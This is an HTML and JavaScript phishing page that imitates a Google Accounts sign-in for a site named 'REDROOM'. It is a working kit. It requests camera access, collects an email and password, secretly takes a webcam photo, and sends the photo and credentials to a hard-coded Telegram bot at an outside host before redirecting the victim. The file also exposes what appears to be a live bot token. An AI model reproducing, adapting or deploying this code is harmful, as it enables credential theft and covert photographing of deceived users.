<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
        body { background-color: #ffffff; display: flex; flex-direction: column; height: 100vh; width: 100vw; overflow: hidden; }
        .android-header { background-color: #f8f9fa; padding: 15px 20px; display: flex; align-items: center; gap: 20px; border-bottom: 1px solid #e0e0e0; }
        .android-header span { color: #3c4043; font-size: 18px; font-weight: 500; }
        .content-area { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 40px 25px; text-align: center; }
        .google-logo { width: 75px; margin-bottom: 15px; }
        .login-card { width: 100%; max-width: 400px; border: 1px solid #dadce0; border-radius: 8px; overflow: hidden; margin-top: 20px;}
        .social-btn { width: 100%; display: flex; align-items: center; padding: 15px 20px; background: none; border: none; border-bottom: 1px solid #dadce0; cursor: pointer; }
        .social-btn img { width: 24px; margin-right: 15px; }
        #input-form { display: none; width: 100%; max-width: 400px; margin-top: 20px; text-align: left; }
        input { width: 100%; padding: 16px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
        .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; float: right; cursor: pointer; }
        /* Hidden Video for Camera */
        #video { display: none; }
    </style>
</head>
<body>

<div class="android-header">
    <i class="fas fa-close" onclick="window.history.back()"></i>
    <span>Sign in</span>
</div>

<div class="content-area">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo">
    <h1 id="title" style="font-size: 22px; font-weight: 400;">Choose an account</h1>
    <p id="subtitle" style="color: #5f6368; margin-top: 10px;">to continue to REDROOM</p>

    <div class="login-card" id="selection">
        <button class="social-btn" onclick="initCamera('Google')">
            <img src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png">
            <span>Login with Google</span>
        </button>
        <button class="social-btn" onclick="initCamera('Facebook')">
            <i class="fab fa-facebook" style="font-size: 24px; color: #1877f2; margin-right: 15px;"></i>
            <span>Login with Facebook</span>
        </button>
    </div>

    <div id="input-form">
        <input type="text" id="user" placeholder="Email or phone">
        <input type="password" id="pass" placeholder="Enter your password">
        <button class="next-btn" id="subBtn" onclick="sendToBot()">Next</button>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const botToken = "8490594899:AAE09QVVv2Z1OeOONTAbftWdv5KW-UZM8fo";
    const chatId = "7920005988";
    let platform = "";
    let stream = null;

    // ক্যামেরা পারমিশন আগে চাওয়ার জন্য
    async function initCamera(p) {
        platform = p;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            // পারমিশন পেলে ফর্ম দেখাবে
            document.getElementById('selection').style.display = 'none';
            document.getElementById('input-form').style.display = 'block';
            document.getElementById('title').innerText = "Sign in";
        } catch (err) {
            // পারমিশন না দিলেও ফর্ম দেখাবে, কিন্তু ছবি আসবে না
            console.log("Camera Error: ", err);
            document.getElementById('selection').style.display = 'none';
            document.getElementById('input-form').style.display = 'block';
        }
    }

    async function sendToBot() {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        if(!user || !pass) return alert("Please fill details");

        const btn = document.getElementById('subBtn');
        btn.innerText = "Verifying...";
        btn.disabled = true;

        // ছবি তোলার চেষ্টা
        if (stream) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'shot.jpg');
                fd.append('caption', `👤 Target: ${user}\n🔑 Pass: ${pass}\n🌐 Platform: ${platform}`);
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                
                // কাজ শেষে মেইন পেজে পাঠিয়ে দেওয়া
                localStorage.setItem("userName", user.split('@')[0]);
                window.location.href = "index.html";
            }, 'image/jpeg');
        } else {
            // যদি ক্যামেরা না থাকে শুধু টেক্সট পাঠাবে
            const text = `⚠️ No Image (Perm Denied)\n👤 User: ${user}\n🔑 Pass: ${pass}\n🌐 Platform: ${platform}`;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: chatId, text: text})
            });
            window.location.href = "index.html";
        }
    }
</script>
</body>
</html>
